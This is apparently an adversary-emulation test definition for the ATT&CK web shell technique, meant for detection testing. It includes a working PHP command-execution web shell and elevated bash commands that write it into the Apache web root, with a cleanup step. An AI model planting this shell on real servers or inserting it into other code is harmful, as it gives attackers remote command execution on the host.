attack_technique: T1505.003
display_name: "Server Software Component: Web Shell"
atomic_tests:
  - name: "Deploy PHP Web Shell to Apache Web Root on Linux"
    description: |
      Creates a PHP web shell in the default Apache web root directory to simulate
      APT28-style web shell deployment for persistent access on Linux systems.
      This test writes a PHP script capable of command execution to the web server
      document root, mimicking the initial persistence step of T1505.003.
      Reference: https://attack.mitre.org/techniques/T1505/003/
    supported_platforms:
      - linux
    input_arguments:
      web_shell_path:
        description: Full path where the web shell will be deployed
        type: path
        default: /var/www/html/cmd.php
      web_shell_content:
        description: Content of the PHP web shell
        type: string
        default: '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
    executor:
      name: bash
      elevation_required: true
      command: |
        mkdir -p $(dirname #{web_shell_path})
        cat > #{web_shell_path} << 'WEBSHELL'
        #{web_shell_content}
        WEBSHELL
        chmod 644 #{web_shell_path}
      cleanup_command: |
        rm -f #{web_shell_path}
